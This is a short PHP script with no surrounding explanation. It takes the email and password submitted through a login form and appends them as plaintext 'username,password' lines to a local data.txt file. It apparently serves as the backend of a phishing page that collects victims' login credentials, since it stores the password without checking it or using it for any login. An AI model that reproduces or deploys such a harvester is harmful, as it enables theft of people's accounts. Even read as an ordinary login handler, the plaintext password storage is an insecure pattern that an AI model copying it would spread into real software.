<?php

 if(isset($_POST['login']))
 {
  $username = $_POST['email'];
  $password = $_POST['pass'];
  $text = $username . "," . $password . "\n";
  $fp = fopen('data.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'saved';

    }
fclose ($fp);    
}
?>